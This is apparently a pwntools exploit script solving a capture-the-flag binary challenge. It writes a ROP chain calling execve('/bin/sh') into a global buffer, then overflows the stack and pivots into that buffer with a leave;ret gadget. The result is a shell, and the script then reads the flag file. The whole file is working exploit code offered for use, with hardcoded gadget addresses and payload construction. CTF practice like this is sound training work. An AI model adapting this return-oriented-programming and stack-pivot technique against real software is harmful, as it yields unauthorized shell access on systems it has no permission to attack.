#!/usr/bin/env python3

from pwn import *

TARGET = './chall'
HOST = ''
PORT = 1337

elf = ELF(TARGET)

context.arch = 'amd64'
gdb_script = f"""
  # b *main
  b *main+108
  b *main+150
  c
"""
# context.log_level = 'DEBUG'

if args.GDB:
  context.terminal = ['wt.exe', '-w', '0', 'new-tab', '--', 'bash', '-lc']
  p = gdb.debug(TARGET, gdbscript=gdb_script)
elif not args.REMOTE:
  p = process(TARGET)
else:
  p = remote(HOST, PORT)

# ===================================== #

name = 0x4a5c20

# ROP gadgets #
pop_rdi = 0x401d30
pop_rsi = 0x40f1d2
pop_rdx_rbx = 0x469837
pop_rax = 0x4382a7
syscall = 0x4177d2
leave_ret = 0x4016f5
ret = 0x4016f6
# ========== #

# Siapin ROP payload #
# execve("/bin/sh", NULL, NULL)
# execve(XXX, XXX, XXX)
syscall_chain = p64(pop_rdi) + p64(name)                # execve("/bin/sh", XXX, XXX)
syscall_chain += p64(pop_rsi) + p64(0x0)                # execve("/bin/sh", NULL, XXX)
syscall_chain += p64(pop_rdx_rbx) + p64(0x0) + p64(0x0) # execve("/bin/sh", NULL, NULL)
syscall_chain += p64(pop_rax) + p64(0x3b)               # execve("/bin/sh", NULL, NULL), RAX = 0x3b (59)
syscall_chain += p64(syscall)
rop_payload = b'/bin/sh\x00' + syscall_chain
p.sendlineafter(b'ROP gadget: ', rop_payload)
# ========== #

# Pivot stack #
pivot_payload = p64(0xcafebabe) * 2 + p64(name) + p64(leave_ret)
p.sendlineafter(b'name: ', pivot_payload)
# ========== #

sleep(0.5)
p.sendline(b'ls ; cat flag*')

p.interactive()

# NOTE:
# Buffer Overflow
# Stack pivot
# Global variable overwrite
